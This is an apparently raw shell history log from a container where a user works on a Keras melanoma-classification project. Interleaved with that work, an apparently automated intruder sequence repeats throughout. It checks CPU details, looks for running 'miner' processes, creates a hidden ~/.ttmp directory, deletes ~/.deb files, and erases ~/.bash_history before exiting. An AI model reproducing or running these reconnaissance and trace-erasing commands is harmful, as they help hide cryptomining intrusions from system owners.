+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161221 20:02 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161221 21:23 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161221 22:41 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161221 22:41 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 22:41 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 22:41 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 22:41 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 22:41 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 22:42 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 22:42 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161221 22:42 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161221 22:42 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 00:01 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 01:19 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 01:19 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 01:19 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 01:19 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 01:19 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 01:19 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 01:19 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 01:19 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 01:19 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 01:20 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 02:41 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 04:15 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 05:59 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 05:59 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 05:59 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 05:59 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 05:59 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 05:59 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 05:59 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 05:59 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 05:59 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 06:00 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 07:43 /notebooks
+rm -f ~/.bash_history;exit  ### @f5e57551b879 not a tty 20161222 07:45 /notebooks
+cd ../datamnt/github/keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161222 07:45 /notebooks -> /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 07:45 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 07:46 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 07:46 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 07:46 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 07:47 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 07:47 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161222 07:47 /datamnt/github/keras-cam-melanoma
+sudo pip install git+git://github.com/fchollet/keras.git --upgrade ### @f5e57551b879 not a tty 20161222 07:51 /datamnt/github/keras-cam-melanoma
+sudo pip install git+git://github.com/fchollet/keras.git --upgrade ### @f5e57551b879 not a tty 20161222 07:51 /datamnt/github/keras-cam-melanoma
+pip install quiver_engine ### @f5e57551b879 not a tty 20161222 07:51 /datamnt/github/keras-cam-melanoma
+lsb_release -a command ### @f5e57551b879 not a tty 20161222 07:59 /datamnt/github/keras-cam-melanoma
+lsb_release -a  ### @f5e57551b879 not a tty 20161222 07:59 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161222 08:01 /datamnt/github/keras-cam-melanoma
+cd .. ### @f5e57551b879 not a tty 20161222 08:01 /datamnt/github/keras-cam-melanoma -> /datamnt/github
+ls ### @f5e57551b879 not a tty 20161222 08:01 /datamnt/github
+git clone git@github.com:jakebian/quiver.git ### @f5e57551b879 not a tty 20161222 08:02 /datamnt/github
+ls ### @f5e57551b879 not a tty 20161222 08:03 /datamnt/github
+cd quiver/ ### @f5e57551b879 not a tty 20161222 08:03 /datamnt/github -> /datamnt/github/quiver
+ls ### @f5e57551b879 not a tty 20161222 08:03 /datamnt/github/quiver
+vi setup.py  ### @f5e57551b879 not a tty 20161222 08:03 /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161222 08:03 /datamnt/github/quiver
+vi setup.py  ### @f5e57551b879 not a tty 20161222 08:04 /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161222 08:04 /datamnt/github/quiver
+cd .. ### @f5e57551b879 not a tty 20161222 08:06 /datamnt/github/quiver -> /datamnt/github
+cd keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161222 08:06 /datamnt/github -> /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:30 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:34 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:37 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:37 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:38 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:38 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:38 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:39 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:39 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:39 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161222 08:39 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:40 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:45 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161222 08:45 /datamnt/github/keras-cam-melanoma
+mkdir imgs ### @f5e57551b879 not a tty 20161222 08:45 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161222 08:46 /datamnt/github/keras-cam-melanoma
+cp ../../train/malignant/558d6142bae47801cf7347b0.jpg  ### @f5e57551b879 not a tty 20161222 08:46 /datamnt/github/keras-cam-melanoma
+cp ../../train/malignant/558d6142bae47801cf7347b0.jpg ./imgs/ ### @f5e57551b879 not a tty 20161222 08:46 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:47 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:47 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:47 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:49 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:50 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:51 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 08:51 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:52 /datamnt/github/keras-cam-melanoma
+mkdir pos ### @f5e57551b879 not a tty 20161222 08:52 /datamnt/github/keras-cam-melanoma
+mkdir neg ### @f5e57551b879 not a tty 20161222 08:52 /datamnt/github/keras-cam-melanoma
+cp ./imgs/558d6142bae47801cf7347b0.jpg pos/ ### @f5e57551b879 not a tty 20161222 08:52 /datamnt/github/keras-cam-melanoma
+cp ./imgs/558d6142bae47801cf7347b0.jpg neg/ ### @f5e57551b879 not a tty 20161222 08:52 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 08:56 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161222 08:56 /datamnt/github/keras-cam-melanoma
+vi tmp/ ### @f5e57551b879 not a tty 20161222 08:56 /datamnt/github/keras-cam-melanoma
+ls train/ ### @f5e57551b879 not a tty 20161222 08:56 /datamnt/github/keras-cam-melanoma
+cd .. ### @f5e57551b879 not a tty 20161222 08:57 /datamnt/github/keras-cam-melanoma -> /datamnt/github
+ls ### @f5e57551b879 not a tty 20161222 08:57 /datamnt/github
+cd quiver/ ### @f5e57551b879 not a tty 20161222 08:57 /datamnt/github -> /datamnt/github/quiver
+ls ### @f5e57551b879 not a tty 20161222 08:57 /datamnt/github/quiver
+vi quiver_engine ### @f5e57551b879 not a tty 20161222 09:02 /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161222 09:02 /datamnt/github/quiver
+cd ../keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161222 09:02 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161222 09:02 /datamnt/github/keras-cam-melanoma
+cp imgs/558d6142bae47801cf7347b0.jpg ./ ### @f5e57551b879 not a tty 20161222 09:04 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 09:04 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161222 09:04 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+vi quiver_engine/server.py  ### @f5e57551b879 not a tty 20161222 09:05 /datamnt/github/quiver
+vi quiver_engine/server.py  ### @f5e57551b879 not a tty 20161222 09:05 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161222 09:05 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 09:05 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161222 09:05 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161222 09:06 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161222 09:06 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 09:06 /datamnt/github/keras-cam-melanoma
+vi ../quiver/quiver_engine/server.py  ### @f5e57551b879 not a tty 20161222 09:15 /datamnt/github/keras-cam-melanoma
+vi ../quiver/quiver_engine/server.py  ### @f5e57551b879 not a tty 20161222 09:15 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161222 09:15 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161222 09:15 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161222 09:15 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 09:15 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161222 09:15 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+vi quiver_engine/server.py  ### @f5e57551b879 not a tty 20161222 09:15 /datamnt/github/quiver
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 09:28 /notebooks
+python setup.py install ### @f5e57551b879 not a tty 20161222 09:30 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161222 09:30 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 09:30 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161222 09:31 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161222 09:31 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+vi quiver_engine/server.py  ### @f5e57551b879 not a tty 20161222 09:35 /datamnt/github/quiver
+vi quiver_engine/server.py  ### @f5e57551b879 not a tty 20161222 09:39 /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161222 09:39 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161222 09:39 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 09:53 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161222 09:53 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+vi quiver_engine/server.py  ### @f5e57551b879 not a tty 20161222 09:54 /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161222 09:55 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161222 09:55 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 09:57 /datamnt/github/keras-cam-melanoma
+mkdir imgs/pos ### @f5e57551b879 not a tty 20161222 09:57 /datamnt/github/keras-cam-melanoma
+mkdir imgs/neg ### @f5e57551b879 not a tty 20161222 09:57 /datamnt/github/keras-cam-melanoma
+mv imgs/558d6142bae47801cf7347b0.jpg imgs/pos/ ### @f5e57551b879 not a tty 20161222 09:58 /datamnt/github/keras-cam-melanoma
+cp imgs/pos/558d6142bae47801cf7347b0.jpg imgs/neg/ ### @f5e57551b879 not a tty 20161222 09:58 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161222 09:58 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 10:11 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161222 10:11 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 11:13 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 11:13 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 11:13 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 11:13 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 11:13 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 11:13 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 11:13 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 11:13 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161222 11:14 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161222 11:14 /notebooks
+vi setup.py  ### @f5e57551b879 not a tty 20161222 11:18 /datamnt/github/quiver
+vi setup.py  ### @f5e57551b879 not a tty 20161222 11:19 /datamnt/github/quiver
+vi quiver_engine/ ### @f5e57551b879 not a tty 20161222 11:44 /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161222 11:44 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161222 11:44 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python setup.py install ### @f5e57551b879 not a tty 20161222 11:44 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True ### @f5e57551b879 not a tty 20161222 11:53 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 12:55 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161222 12:55 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 12:55 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161222 12:55 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161222 12:55 /notebooks
